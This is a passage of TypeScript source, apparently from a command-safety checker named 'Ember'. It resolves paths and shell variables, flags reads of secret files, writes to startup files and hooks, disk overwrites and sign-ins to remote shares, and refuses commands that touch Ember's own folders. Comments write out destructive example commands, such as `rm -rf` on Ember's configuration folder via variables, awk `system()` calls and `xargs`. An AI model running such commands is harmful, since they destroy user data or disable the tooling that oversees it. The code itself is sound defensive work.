   * Ember's too; it would not "change Ember's own programs" as written (commands-held-x9-7).
   */
  heldRefusal(): void {
    if (!this.refuse) return;
    const says = this.refuse.says === SAYS.refuseRead ? SAYS.heldRefuseRead : this.refuse.says === SAYS.refuseInput ? SAYS.heldRefuseInput
      : this.refuse.says === SAYS.refuseTerminal ? SAYS.heldRefuseTerminal : SAYS.heldRefuseSafety;
    this.refuse = { rule: this.refuse.rule, says };
  }

  /**
   * Whether `judge` finds anything to ask about, judged apart: what it finds is not kept (a refusal, and what it notes
   * of files and variables, is). For a form Ember judges a second way, which must never decide less safely than the
   * first (commands-remote-r7-2). `apartFrom`: rules that don't count as asking (a flow word's own, which the command
   * proper finds too).
   */
  asksApart(judge: () => void, apartFrom?: RegExp): boolean {
    return this.foundApart(judge, apartFrom).length > 0;
  }

  /**
   * What `judge` finds, judged apart, without the rules of `apartFrom`: asksApart's findings themselves, for heldTo,
   * which keeps the dangers among them.
   */
  foundApart(judge: () => void, apartFrom?: RegExp): Finding[] {
    const kept = this.findings;
    this.findings = [];
    try {
      judge();
      return apartFrom ? this.findings.filter(f => !apartFrom.test(f.rule)) : this.findings;
    } finally {
      this.findings = kept;
    }
  }

  /**
   * Holds what was found since `from` to what the same command asked read the way it was before (`was`: foundApart's
   * findings for that reading), so no way of reading a command decides less safely than the one before it
   * (commands-held). Where that reading asked, this asks (asksAtLeast). A danger it named that this one doesn't (any
   * class but unclear, by its rule; one that depends on a file being there doesn't stand for one that doesn't) stays, in
   * its own words and for no intent row to cover: the card, the audit and an approval mode that asks by class (a secret
   * read, a command that outlives Stop) are told no less than they were.
   */
  heldTo(was: readonly Finding[], from: number, rule: string, says: string): void {
    if (was.length === 0) return;
    const found = this.findings.slice(from);
    this.asksAtLeast(from, rule, says);
    for (const f of was) {
      if (f.cls === "unclear" || found.some(g => g.rule === f.rule && (g.ifExists === undefined || g.ifExists === f.ifExists))) continue;
      if (this.findings.some(g => g.at === this.at && g.rule === f.rule && g.says === f.says && g.ifExists === f.ifExists)) continue;
      this.findings.push({ ...f, widening: f.widening.includes("fed") ? [...f.widening] : [...f.widening, "fed"], at: this.at });
    }
  }

  /**
   * Makes what was found since `from` ask whatever the user's words say (the "fed" widening, which no intent row
   * covers); with nothing found that stands whatever the target's files are, an unclear finding asks instead. A flow
   * word's own finding (`then` before the command) doesn't stand: on an sh or bash line it is read through, so the
   * command would run (commands-remote-x7-4).
   */
  asksAtLeast(from: number, rule: string, says: string): void {
    const found = this.findings.slice(from);
    for (const f of found) if (!f.widening.includes("fed")) f.widening.push("fed");
    if (!found.some(f => f.ifExists === undefined && !READ_FLOW_RULE.test(f.rule))) this.unclear(rule, says);
  }

  /**
   * Starts a row's second reading (Engine.runRow), which must leave nothing behind that could pass for the row's own
   * or make a later command decide more loosely. The function returned puts back, as the row's own reading left them:
   * - the words judged as paths or handed to a command, which that reading marks in a layer of its own (WordMarks:
   *   commands-held-x9-1);
   * - everything kept by a command's index: the commands the reading registered, whose indexes the commands registered
   *   next take (a read's seen text or a listing kept for another command must never count for them), and the current
   *   command's too, since a wrapper's unwrap judges at the wrapper's own index and main's `read v`, text seen, would
   *   stand for the row's `read -u 3 …`, which asks (commands-held-x9-3);
   * - what a command can switch off or replace: `set -a` (main's `env -a set +a` ran `set +a`, the row's own ran nothing,
   *   so a variable set to Ember's folder afterwards is still exported and refused: commands-held-x9-1), a loop's
   *   variables for the card's words, and the downloads that stop counting once the target says they are folders.
   * What that reading only adds to stays, because more of it only ever asks or refuses: paths to probe, download marks
   * (which never stop a script being read: recordScript), scripts to read, files written, variables' values and uses.
   */
  protected readApart(): () => void {
    const marks = [this.judgedWords.apart(), this.payloadWords.apart()];
    const maps: Map<unknown, unknown>[] = [this.listed, this.readText, this.closerInput, this.hereVarsAt, this.hereAt, this.readSets, this.loopVars];
    const sets = [this.globalOpts, this.stdinGiven];
    const was = { maps: maps.map(m => [...m]), sets: sets.map(x => [...x]), probeFull: this.probeFull, allExport: this.allExport, ifFile: this.downloadsIfFile.length };
    return () => {
      for (const back of marks) back();
      maps.forEach((m, k) => { m.clear(); for (const [i, v] of was.maps[k]) m.set(i, v); });
      sets.forEach((x, k) => { x.clear(); for (const i of was.sets[k]) x.add(i); });
      // Its finding for more paths than Ember checks went with its other findings: a later command that names one more says so.
      this.probeFull = was.probeFull;
      this.allExport = was.allExport;
      this.downloadsIfFile.length = was.ifFile;
    };
  }

  noteUnclear(list: readonly Unclear[]): void {
    for (const u of list) this.unclear(`unclear.${u.why.replace(/[^a-z0-9]+/gi, "-").replace(/^-|-$/g, "").toLowerCase() || "syntax"}`, u.says ?? SAYS.unclear);
  }

  // ----------------------------------------------------------------------------------------------------------------
  // Commands.

  /** Registers a simple command and makes it current; returns its index. */
  newCommand(program: string, args: Arg[], sc: Scope, redirs: Redir[], background: boolean, pipedFrom?: number): number {
    this.simpleCount++;
    const pc: ParsedCommand = {
      program,
      args: args.map(a => a.v),
      wrappers: [...sc.wrappers],
      redirects: redirs.filter(r => r.kind !== "none").map(r => ({ op: r.op, target: r.target ? r.target.v : null })),
      background,
      family: sc.family,
    };
    if (pipedFrom !== undefined) pc.pipedFrom = pipedFrom;
    this.commands.push(pc);
    this.at = this.commands.length - 1;
    this.program = program;
    return this.at;
  }

  noteProgram(name: string): void {
    if (name && !this.programs.includes(name)) this.programs.push(name);
  }

  // ----------------------------------------------------------------------------------------------------------------
  // Paths.

  addProbe(abs: string): void {
    if (this.probe.includes(abs)) return;
    if (this.probe.length >= MAX_PROBE) {
      if (!this.probeFull) { this.probeFull = true; this.unclear("unclear.too-many-paths", "It names more files than Ember can check one by one."); }
      return;
    }
    this.probe.push(abs);
  }

  /**
   * A path argument used one way: resolved with the scope's rules, probed, and judged by §3.6's rules (Ember's own
   * paths refused; secrets class d; start-up files, hooks, WSL's configuration, system locations and autostart class
   * e on writes), on the lexical form and, on the second pass, the real one too.
   */
  usePath(a: Arg, use: PathUse, sc: Scope): Obj {
    const text = a.v;
    if (text === null) {
      this.judgeUnseen(a, use, sc);
      return { kind: "other", text: a.raw, abs: null };
    }
    if (text === "") return { kind: "other", text, abs: null };
    if (sc.path.flavour === "win32") {
      const wsl = wslUncPath(text);
      if (wsl) {
        const env = pathEnv({ flavour: "posix", os: "linux", home: null, cwd: null, ember: [] });
        this.judge(wsl.path, use, env, text, sc);
        this.addProbe(text);
        return { kind: "path", text, resolved: text, abs: text };
      }
      const opaque = opaqueWindowsPath(text);
      if (opaque) {
        this.unclear("unclear.windows-path", "Ember can't tell which file this names.");
        if (WRITES.has(use) && /^[\\/]{2}\.[\\/](physicaldrive\d+|[a-z]:)$/i.test(text)) this.add("destroy", "path.disk", `Overwrites the disk ${text}.`);
        return { kind: "other", text, abs: null };
      }
      if (/^[\\/]{2}[^\\/?.]/.test(text)) {
        // Another computer's share: Windows connects and signs in there with the user's account before anything is
        // read, so even a listing hands that computer what it needs to pose as the user (review #171).
        const host = /^[\\/]{2}([^\\/]+)/.exec(text)?.[1] ?? "";
        const objects: Obj[] = [{ kind: "host", text: host, abs: null }];
        if (WRITES.has(use)) this.add("publish", "upload.unc", `Sends data to ${host}.`, { objects });
        else if (use === "exec") this.add("escape", "escape.run-remote", `Runs a program from another computer (${host}).`, { objects });
        else this.add("publish", "net.unc", `Connects to ${host} and signs in there with your Windows account.`, { objects });
      }
    }
    if (sc.path.flavour === "posix" && (text === "~" || text.startsWith("~/")) && !sc.home) {
      // A home Ember doesn't know (a distro reached from Windows): judged as some user's home, never probed.
      this.judge(posix.join("/home/~", text.slice(1) || "/"), use, sc.path, text, sc);
      return { kind: "other", text, abs: null };
    }
    if (!isAbsolute(text, sc.path.flavour) && !text.startsWith("~") && !sc.cwd) {
      // The folder is unknown (after a cd that may have failed, or a distro's folder seen from Windows): the name is
      // judged by itself (a secret or history file name, a git hook), and a command that uses it asks.
      this.judge(sc.path.flavour === "win32" ? `?:\\?\\${text}` : posix.join("/?", text), use, sc.path, text, sc);
      if (!sc.foreign && use !== "list" && use !== "cd") this.unclear("unclear.folder", "Ember can't tell which folder this command runs in.");
      return { kind: "other", text, abs: null };
    }
    if (a.glob) return this.useGlob(a, use, sc);
    const abs = resolveTargetPath(text, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
    if (WRITES.has(use)) this.written.push({ p: abs, env: sc.path });
    if (!sc.foreign) this.addProbe(abs);
    this.judge(abs, use, sc.path, text, sc);
    const obj: Obj = { kind: "path", text, resolved: abs, abs };
    const real = this.ctx.real?.get(abs);
    if (real && real !== abs) {
      obj.realDiffers = true;
      this.judge(real, use, sc.path, text, sc);
      // A write through a link lands at its target: a script run there by that name was written by this command.
      if (WRITES.has(use)) this.written.push({ p: real, env: sc.path });
    }
    // The file the kernel opens for a path with `..` (`cat sub/../x`, sub a link): its form with `..` kept is probed
    // too, and on the second pass its real path is judged and remembered as written like the lexical one.
    const phys = this.physical(text, use, sc);
    if (phys !== null) {
      obj.phys = phys;
      this.addProbe(phys);
      const r = this.ctx.real?.get(phys);
      if (r && r !== abs) {
        obj.realDiffers = true;
        this.judge(r, use, sc.path, text, sc);
        if (WRITES.has(use)) this.written.push({ p: r, env: sc.path });
        if (sc.wsl && sc.mountRoot && isUnder(r, sc.mountRoot, sc.path)) this.windowsReach = true;
      }
    }
    if (sc.path.flavour === "win32" && SHORT_NAME.test(abs) && !(real && !SHORT_NAME.test(real))) {
      this.unclear("unclear.short-name", "Ember can't tell which file this names.");
    }
    if (sc.wsl && sc.mountRoot && isUnder(abs, sc.mountRoot, sc.path)) {
      this.windowsReach = true;
      if (SHORT_NAME.test(abs.slice(sc.mountRoot.length)) && !(real && !SHORT_NAME.test(real))) this.unclear("unclear.short-name", "Ember can't tell which file this names.");
    }
    if (sc.fromWsl) this.windowsReach = true;
    return obj;
  }

  /**
   * A POSIX variable's value the text sets (`d=…`, `export d=…`, a loop's list, `set --`'s `$1`…, `printf -v d`, `read
   * d` from a here-string: its lines and words, else unseen), kept for the words that use the variable later, where it
   * is judged as the path it names (commands-remote-c3-2). Only a value that may reach a program's environment (`export`,
   * `declare -x`, an assignment before a command, or an environment variable's name such as XDG_CONFIG_HOME) is judged
   * when it is set, for any use: testing or printing a plain variable reads nothing (commands-remote-r4-5). Every value
   * is kept, earlier ones too, so a value set again inside a loop still counts. A name set again no longer says the
   * loop's files on the card.
   */
  /** The values this line gave a variable, as far as Ember can read them. */
  valuesOf(name: string): readonly string[] {
    return (this.varValues.get(name) ?? []).filter(f => !f.includes(UNSEEN) && !f.startsWith(PATTERN));
  }

  setVar(name: string, values: readonly Arg[] | null, sc: Scope, loop = false, exported = false): void {
    if (!loop) this.setsVars = true;
    if (!/^([A-Za-z_]\w*|[1-9@*])$/.test(name)) return;
    if (!loop) this.loopVars.delete(name);
    if (sc.family !== "posix") return;
    const forms = values === null ? [UNSEEN] : values.flatMap(a => (a.v !== null ? [a.glob ? PATTERN + (a.pattern ?? a.v) : a.v] : a.parts ? this.formsOf(a.parts) : [UNSEEN]));
    if (values === null || values.some(a => this.mayHoldWords(a))) this.wordVars.add(name);
    if (exported || this.allExport || /^[A-Z][A-Z0-9_]*$/.test(name)) for (const f of forms) this.judgeForm(f, null, sc, exported || this.allExport);
    else this.pendingSets.push({ name, forms, sc });
    const all = [...new Set([...(this.varValues.get(name) ?? []), ...forms])];
    this.varValues.set(name, all.length > MAX_FORMS ? [UNSEEN] : all);
  }

  /**
   * Whether a word Ember can't see all of may hold any words the shell could split it into: a command's output, an
   * expansion other than a plain variable, or a variable the text set to one, a read or a loop over such words; never
   * a variable the text doesn't set (commands-z6-4).
   */
  mayHoldWords(a: Arg): boolean {
    if (a.v !== null) return false;
    if (!a.parts) return true;
    for (const p of a.parts) {
      if (typeof p === "string" || p.value !== undefined) continue;
      if (p.name === null || this.wordVars.has(p.name)) return true;
    }
    return /\$\(|`|[<>]\(/.test(a.raw);
  }

  /**
   * A `read`, `mapfile` or `readarray` whose text Ember can't see asks, in a loop or not, whatever its variables are
   * used for later (commands-a7-2): its text counts as seen only when it reads its standard input (no `-u`, no `<&3`, no
   * redirection of its own but a here-string or here-document) and that is a here-string or here-document Ember sees
   * whole, its own or given by its loop's or `if`'s closer (`done <<< 'a b'`). One that waits for the user's typing
   * already says so (unclear.interactive).
   */
  protected judgeReadText(): void {
    const closers = fedReadsByCloser(this.commands, i => this.stdinGiven.has(i));
    const at = this.at;
    const program = this.program;
    for (const [r, how] of this.readText) {
      const closer = closers.get(r);
      if (how === "seen" || (how === "closer" && closer !== undefined && this.closerInput.get(closer) === "seen")) continue;
      if (this.findings.some(f => f.at === r && f.rule === "unclear.interactive")) continue;
      this.at = r;
      this.program = this.commands[r]?.program ?? "";
      this.unclear(...READ_TEXT);
    }
    this.at = at;
    this.program = program;
  }

  /**
   * Ember's own refusal for a word Ember couldn't resolve, by the values the text gave the variables in it (`rm -rf
   * "$d"` after `d=~/.config/ember`, `for f in ~; do rm -rf "$f"; done`): refused as the path itself would be.
   */
  judgeUnseen(a: Arg, use: PathUse, sc: Scope, asPath = true): void {
    // An option with its value attached (`--dir="$d"`) isn't a path, whatever was asked of it; nor is a program word
    // (`env X="$d" make`'s first word may be an assignment), which stays a use Ember didn't judge (noteVarUses).
    if (asPath && (typeof a.parts?.[0] !== "string" || !a.parts[0].startsWith("-"))) this.judgedWords.add(a);
    if (a.v === null && a.parts && sc.path.flavour === "posix") {
      for (const form of this.formsOf(a.parts)) this.judgeForm(form, use, sc);
      this.unseenUses.push({ parts: a.parts, use, sc });
    } else if (a.v === null && a.parts && sc.path.flavour === "win32") {
      for (const form of this.formsOf(a.parts, this.psVarValues)) this.judgeWinForm(form, use, sc);
    }
  }

  /**
   * A PowerShell variable's value the text sets (`$d = "$env:LOCALAPPDATA\ember"`, `$d = Join-Path …`; null: one Ember
   * can't see), kept for the words that use it later, for Ember's own refusal only (commands-remote-c3-2).
   */
  setPsVar(name: string, value: Arg | null): void {
    const key = name.toLowerCase().replace(/^(script|global|local|private|using):/, "");
    const forms = value === null ? [UNSEEN] : value.v !== null ? [value.v] : value.parts ? this.formsOf(value.parts, this.psVarValues) : [UNSEEN];
    const all = [...new Set([...(this.psVarValues.get(key) ?? []), ...forms])];
    this.psVarValues.set(key, all.length > MAX_FORMS ? [UNSEEN] : all);
  }

  /**
   * Ember's own refusal for one form of a Windows word (judgeForm's rules in Windows paths): the path it names, a
   * pattern (PowerShell's -Path takes wildcards even when quoted), or, with a part Ember can't see, anything in one of
   * Ember's folders or (to change or read) a name that could be one in the folder that holds it.
   */
  private judgeWinForm(value: string, use: PathUse, sc: Scope): void {
    const form = value.startsWith(PATTERN) ? value.slice(1) : value;
    const cut = form.indexOf(UNSEEN);
    const known = cut < 0 ? form : form.slice(0, cut);
    if (known === "" || (!/^[A-Za-z]:[\\/]|^[\\/]{2}/.test(known) && !sc.cwd)) return;
    const at = { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" };
    const kind = accessOf(use);
    if (cut < 0) {
      const abs = resolveTargetPath(form, at);
      if (/[*?[]/.test(form)) {
        let reaches: boolean;
        try { reaches = globReaches(abs, use, sc.path, false).ember || isEmberPath(globPrefix(abs, sc.path), sc.path); } catch { reaches = isEmberPath(abs.replace(/[*?[].*$/, ""), sc.path); /* a pattern the matcher can't read: its fixed part decides */ }
        if (reaches) this.refuseWith("ember.path", kind);
      } else if (isEmberPath(abs, sc.path)) this.refuseWith("ember.path", kind);
      else if ((use === "deleteTree" || use === "move" || use === "permTree") && holdsEmberPath(abs, sc.path)) this.refuseWith("ember.path", "safety");
      return;
    }
    const slash = Math.max(known.lastIndexOf("\\"), known.lastIndexOf("/"));
    const dir = resolveTargetPath(slash < 0 ? "." : known.slice(0, slash) || "\\", at);
    const stem = known.slice(slash + 1).toLowerCase();
    if (isEmberPath(dir, sc.path) || isEmberPath(resolveTargetPath(known, at), sc.path)) { this.refuseWith("ember.path", kind); return; }
    if (use === "list" || use === "cd") return;
    if (sc.path.ember.some(e => win32.dirname(e).toLowerCase() === dir.toLowerCase() && win32.basename(e).toLowerCase().startsWith(stem))) this.refuseWith("ember.path", kind);
  }

  /**
   * A command's words that use a variable and that its row didn't judge as paths (commands-remote-r4-5): the variable's
   * values are judged at the end (judgePendingSets), unless the command only tests or prints it.
   */
  noteVarUses(key: string, args: readonly Arg[], out: "shown" | "carried" | "onward" = "shown"): void {
    // A flow word's command is the one after it (`do echo "$f"`, `then time printf …`).
    let k = key;
    let rest = args;
    while (ASSIGNS_AFTER.has(k) && rest.length > 0 && rest[0].v !== null) { k = rest[0].v.split("/").pop() ?? ""; rest = rest.slice(1); }
    if (VAR_SHOWN_ONLY.has(k)) {
      // Printed to the terminal it is only shown, and printed by echo or printf into the next command that command
      // judges it as its input (printedBy); printed anywhere else, whatever reads it may change what it names
      // (`echo "$d" > list.txt; xargs rm -rf < list.txt`: commands-remote-c5-1).
      if (!VAR_PRINTERS.has(k) || (out === "carried" && (k === "echo" || k === "printf"))) return;
      const names = [...new Set(rest.flatMap(varNames))];
      if (out === "shown") for (const n of names) this.printedVars.add(n);
      else this.useUnjudged(names, true);
      return;
    }
    for (const a of rest) {
      if (a.v !== null || !a.parts || this.judgedWords.has(a)) continue;
      for (const p of a.parts) if (typeof p !== "string" && p.name !== null) this.usedUnjudged.add(p.name);
    }
  }

  /**
   * Variables a command uses where Ember judges no path: its stdin's text (`xargs rm -rf <<< "$d"`) or an export to
   * the programs it runs (`export d`): their values are judged at the end (commands-remote-v5-2), as changed when the
   * program may change what they name (`change`: commands-remote-w5-5).
   */
  useUnjudged(names: readonly string[], change = false): void {
    for (const n of names) {
      this.usedUnjudged.add(n);
      if (change) this.changedUnjudged.add(n);
    }
  }

  /** The values of variables used in a word Ember didn't judge (noteVarUses), judged as round four judged every value. */
  protected judgePendingSets(): void {
    if (this.compoundOnward) this.useUnjudged([...this.printedVars], true);
    for (const p of this.pendingSets) if (this.usedUnjudged.has(p.name)) for (const f of p.forms) this.judgeForm(f, null, p.sc, this.changedUnjudged.has(p.name));
  }

  /**
   * Text a program that may run or write what it reads is given whole (`awk '{system("rm -rf " $0)}' <<<
   * ~/.config/ember`): each line and word judged by Ember's own refusal as a path it may change (commands-remote-r5-4).
   */
  judgeInput(text: string, sc: Scope): void {
    for (const a of textValues(text)) if (a.v !== null) this.judgeForm(a.v, null, sc, true);
  }

  /** The names a `read` sets, for a loop's here-string to give them values (result). */
  noteRead(names: string[], sc: Scope): void {
    if (names.length) this.readSets.set(this.at, { names, sc });
  }

  /** What the `read`, `mapfile` or `readarray` now judged reads, for judgeReadText at the end (commands-a7-2). */
  noteReadText(how: "seen" | "closer" | "unseen"): void {
    this.readText.set(this.at, how);
  }

  /**
   * A `read` in a loop or `if` whose closer gives it a here-string or here-document (`while read f; do rm -rf "$f";
   * done <<< ~/.config/ember`): its names get that text's lines and words, and the words that used them are judged
   * again with them, for Ember's own refusal (commands-remote-v4-4).
   */
  protected feedReads(): void {
    const fedClosers = new Set<number>();
    for (const [r, closer] of fedReadsByCloser(this.commands, i => this.stdinGiven.has(i))) {
      const text = this.hereAt.get(closer);
      const set = this.readSets.get(r);
      // Text Ember can't see that uses a variable (`done <<< "$d"`): the here-string's word is what the read gets.
      const word = this.hereVarsAt.get(closer)?.word;
      if ((typeof text !== "string" && !word) || !set) continue;
      fedClosers.add(closer);
      for (const name of set.names) {
        this.setVar(name, typeof text === "string" ? textValues(text) : [word as Arg], set.sc, true);
        for (const u of this.unseenUses) {
          if (!u.parts.some(p => typeof p !== "string" && p.name === name)) continue;
          for (const form of this.formsOf(u.parts)) this.judgeForm(form, u.use, u.sc);
        }
      }
    }
    // A closer's text that no read takes, or a here-document's: a use Ember didn't judge (commands-remote-v5-2), by
    // commands it can't follow (commands-remote-w5-5).
    for (const [closer, hv] of this.hereVarsAt) if (!fedClosers.has(closer)) this.useUnjudged(hv.names, true);
  }

  /**
   * The values the text gives a word (formsOf): null for one with a part Ember can't see (with `unseen`, the form with
   * UNSEEN where that part stands: commands-y6-2), a resolved word its own value (`T=deploy; make -j "$T"`:
   * commands-remote-w5-2).
   */
  knownForms(a: Arg, unseen = false): (string | null)[] {
    if (a.v !== null) return [a.v];
    if (!a.parts) return [unseen ? UNSEEN : null];
    return this.formsOf(a.parts).map(f => (f.includes(UNSEEN) && !unseen ? null : f.replace(PATTERN, "")));
  }

  /** The forms a word may take with the values the text gave its variables (UNSEEN for any other part). */
  private formsOf(parts: readonly Part[], vars: ReadonlyMap<string, string[]> = this.varValues): string[] {
    let out = [""];
    for (const p of parts) {
      const known = typeof p === "string" ? [p] : p.value !== undefined ? [p.value] : (p.name !== null && vars.get(p.name)) || [UNSEEN];
      // A cut or a default: its values, and text Ember can't see (commands-remote-w5-1).
      const cut = typeof p !== "string" && p.cut && !known.includes(UNSEEN) ? [...known, UNSEEN] : known;
      const vals = typeof p !== "string" && p.alt !== undefined && !cut.includes(p.alt) ? [...cut, p.alt] : cut;
      const next = out.flatMap(a => vals.map(b => a + b));
      // Too many to judge one by one: what stands there is unseen (judgeForm's rule for an unseen part).
      out = next.length > MAX_FORMS ? out.map(a => a + UNSEEN) : next;
    }
    // A pattern anywhere makes the whole form one (its mark goes in front); judgeForm reads up to the first UNSEEN.
    return [...new Set(out.map(f => (f.includes(PATTERN) ? PATTERN : "") + f.split(PATTERN).join("")))];
  }

  /**
   * Ember's own refusal for one form of a word (formsOf), for `use` (null: any use, when a variable is set). A whole
   * form is judged as the path or pattern it names; with a part Ember can't see, what it could become is: anything in
   * one of Ember's folders, or (to change or read, not to list or enter) a name that could be one of them in the folder
   * that holds it (`rm -rf ~/.config/$x`).
   */
  private judgeForm(value: string, use: PathUse | null, sc: Scope, change = false): void {
    if (sc.path.flavour !== "posix") return;
    const pattern = value.startsWith(PATTERN);
    const form = pattern ? value.slice(1) : value;
    const cut = form.indexOf(UNSEEN);
    const known = cut < 0 ? form : form.slice(0, cut);
    if (known === "" || (known.startsWith("~") && !sc.home) || (!known.startsWith("/") && !known.startsWith("~") && !sc.cwd)) return;
    const at = { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" };
    // Set, not yet used: "would read", which gives way to "would change" when a later command writes with it; handed to
    // a program that may change it (`change`, an export): "would change" (commands-remote-w5-5).
    const kind = use === null ? (change ? "safety" : "read") : accessOf(use);
    const tree = use === "deleteTree" || use === "move" || use === "permTree";
    if (cut < 0) {
      const abs = resolveTargetPath(form, at);
      if (pattern) {
        let reaches: boolean;
        try { reaches = globReaches(abs, use ?? "read", sc.path, true).ember || isEmberPath(globPrefix(abs, sc.path), sc.path); } catch { reaches = isEmberPath(abs.replace(/[*?[].*$/, ""), sc.path); /* a pattern the matcher can't read: its fixed part decides */ }
        if (reaches) this.refuseWith("ember.path", kind);
      } else if (isEmberPath(abs, sc.path)) this.refuseWith("ember.path", kind);
      else if (tree && holdsEmberPath(abs, sc.path)) this.refuseWith("ember.path", "safety");
      return;
    }
    if (pattern && /[*?[]/.test(known)) {
      // A pattern Ember sees only the start of (`rm -rf ~/.c*/$x`): refused when it could match one of Ember's folders,
      // or (to change or move) one that holds one, whatever follows the part Ember sees (commands-remote-v4-4).
      if (use === "list" || use === "cd") return;
      const abs = resolveTargetPath(/\*$/.test(known) ? known : `${known}*`, at);
      let reaches: boolean;
      try { reaches = globReaches(abs, use ?? "read", sc.path, true).ember; } catch { reaches = isEmberPath(abs.replace(/[*?[].*$/, ""), sc.path); /* a pattern the matcher can't read: its fixed part decides */ }
      if (reaches) this.refuseWith("ember.path", kind);
      return;
    }
    const slash = known.lastIndexOf("/");
    const dir = resolveTargetPath(slash < 0 ? "." : known.slice(0, slash) || "/", at);
    const stem = known.slice(slash + 1);
    if (isEmberPath(dir, sc.path) || isEmberPath(resolveTargetPath(known, at), sc.path)) { this.refuseWith("ember.path", kind); return; }
    if (use === null || use === "list" || use === "cd") return;
    const ci = sc.os === "darwin";
    const near = sc.path.ember.some(e => posix.dirname(e) === dir && (ci ? posix.basename(e).toLowerCase().startsWith(stem.toLowerCase()) : posix.basename(e).startsWith(stem)));
    if (near) this.refuseWith("ember.path", kind);
  }

  /** A glob: its fixed folder is probed and judged; the pattern is tested against secret and Ember paths. */
  private useGlob(a: Arg, use: PathUse, sc: Scope): Obj {
    const text = a.v ?? a.raw;
    const pattern = a.pattern ?? text;
    const absPattern = resolveTargetPath(pattern, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
    const prefix = globPrefix(absPattern, sc.path);
    if (WRITES.has(use)) this.written.push({ p: prefix, env: sc.path });
    if (!sc.foreign) this.addProbe(prefix);
    this.judge(prefix, use, sc.path, text, sc, true);
    const dotRule = sc.family === "posix";
    // Every name the pattern could match is judged (a pattern can't be probed): a secret folder or file name, Ember's
    // own paths (one of them, inside one, or, for a tree operation, a folder holding one). On the second pass the
    // fixed folder's real path is judged too, with the rest of the pattern under it.
    const forms = [absPattern];
    const realPrefix = this.ctx.real?.get(prefix);
    if (realPrefix && realPrefix !== prefix) {
      forms.push(realPrefix + absPattern.slice(prefix.length));
      this.judge(realPrefix, use, sc.path, text, sc, true);
    }
    // `..` in the fixed folder is walked through links by the kernel (`cat sub/../*.pem`): that folder is probed as
    // written and its real path judged with the rest of the pattern; a `..` after a wildcard can't be followed at all.
    const physPattern = this.physical(pattern, use, sc);
    if (physPattern !== null) {
      const physPrefix = globPrefix(physPattern, sc.path);
      // The pattern's segments after the fixed folder's (counted, not measured: the folder comes back unescaped).
      const rest = physPattern.split("/").slice(physPrefix.split("/").length).join("/");
      if (DOT_DOT.test(rest)) this.unclear("unclear.glob-parent", "Ember can't tell which files this names.");
      else if (DOT_DOT.test(physPrefix)) {
        this.addProbe(physPrefix);
        const r = this.ctx.real?.get(physPrefix);
        if (r && r !== prefix) {
          forms.push(`${r.replace(/\/$/, "")}/${rest}`);
          this.judge(r, use, sc.path, text, sc, true);
          if (WRITES.has(use)) this.written.push({ p: r, env: sc.path });
        }
      }
    }
    let secret = false;
    for (const f of forms) {
      const r = globReaches(f, use, sc.path, dotRule);
      if (r.ember) this.refuseWith("ember.path", accessOf(use));
      if (r.secret) secret = true;
    }
    if (secret) {
      this.add("secret", "path.secret", `Reads or changes passwords, keys or other secrets (${text}).`, { objects: [{ kind: "glob", text, resolved: absPattern, abs: absPattern }] });
    }
    if (WRITES.has(use)) {
      for (const f of forms) {
        const k = writeKind(globPrefix(f, sc.path), sc.path) ?? globWriteKind(f, sc.path, dotRule);
        if (k) this.writeFinding(k, text);
      }
    }
    if (sc.wsl && sc.mountRoot && isUnder(prefix, sc.mountRoot, sc.path)) this.windowsReach = true;
    return { kind: "glob", text, resolved: absPattern, abs: absPattern };
  }

  /**
   * The form with `..` kept of a path a program opens (physicalForm), on the target's own POSIX filesystem: the kernel
   * walks `..` through links, unlike the lexical form. Null for a path without one, a foreign scope's (never probed),
   * Windows' (Win32 removes `..` lexically too), and a `cd` target (the shell's own `cd` is lexical, as the scope's
   * folder is; after `cd -P`, which follows links, the cd rule leaves the folder unknown).
   */
  physical(text: string, use: PathUse, sc: Scope): string | null {
    if (sc.foreign || use === "cd" || sc.path.flavour !== "posix") return null;
    return physicalForm(text, { os: sc.os === "win32" ? "linux" : sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
  }

  /** A write into a folder whose new file Ember can't name: a file in it, judged by §3.6's rules (not probed). */
  judgeInside(abs: string, use: PathUse, sc: Scope, text: string): void {
    this.judge((sc.path.flavour === "win32" ? win32 : posix).join(abs, "x"), use, sc.path, text, sc);
  }

  /** §3.6's rules on one absolute path. */
  private judge(abs: string, use: PathUse, env: PathEnv, text: string, sc: Scope, isPrefix = false): void {
    if (isEmberPath(abs, env) || (sc.path !== env && isEmberPath(abs, sc.path))) this.refuseWith("ember.path", accessOf(use));
    // A glob's fixed folder: what it holds is judged by the pattern (useGlob), not the whole folder.
    if (!isPrefix && (use === "deleteTree" || use === "move" || use === "permTree") && holdsEmberPath(abs, env)) this.refuseWith("ember.path", "safety");
    const child = (env.flavour === "win32" ? win32 : posix).join(abs, "x");
    const sk = isPrefix ? (use === "list" || use === "cd" ? null : secretKind(child, "read", env) === "secret" ? "secret" : null) : secretKind(abs, use, env);
    if (sk === "history") this.add("secret", "path.history", SAYS.history, { objects: [{ kind: "path", text, resolved: abs, abs }] });
    else if (sk === "secret") this.add("secret", "path.secret", `Reads or changes passwords, keys or other secrets (${text}).`, { objects: [{ kind: "path", text, resolved: abs, abs }] });
    if (use === "readTree" && !sk && !isPrefix && holdsSecret(abs, env)) {
      this.add("secret", "path.secret-tree", `Reads or changes passwords, keys or other secrets (${text} holds some).`, { objects: [{ kind: "path", text, resolved: abs, abs }] });
    }
    if (WRITES.has(use) && !isPrefix) {
      const k = writeKind(abs, env);
      if (k) this.writeFinding(k, text);
    }
  }

  private writeFinding(k: NonNullable<ReturnType<typeof writeKind>>, text: string): void {
    switch (k) {
      case "startup": this.add("system", "path.startup", "Changes what runs when you open a shell or log in."); break;
      case "hook": this.add("system", "path.hook", "Adds a git hook that runs later."); break;
      case "git-config": this.add("system", "git.config.code", "Changes what git runs later."); break;
      case "wsl-config": this.add("system", "path.wsl-config", "Changes how WSL starts."); break;
      case "autostart": this.add("system", "path.autostart", "Schedules something to run later or at login."); break;
      case "system": this.add("system", "path.system", "Changes system files."); break;
      case "disk": this.add("destroy", "path.disk", `Overwrites the disk ${text}.`); break;
      case "bin": this.add("system", "path.bin", "Changes which program a command name runs."); break;
      case "program-config": this.add("system", "path.program-config", "Changes what a program runs the next time you use it."); break;
    }
  }

  /**
   * Records a shell script this command runs by path, so the flow reads its text and classifies it (L8, the lead's
   * ruling). Only a resolvable path on the target's own filesystem, not one an earlier command of this task downloaded
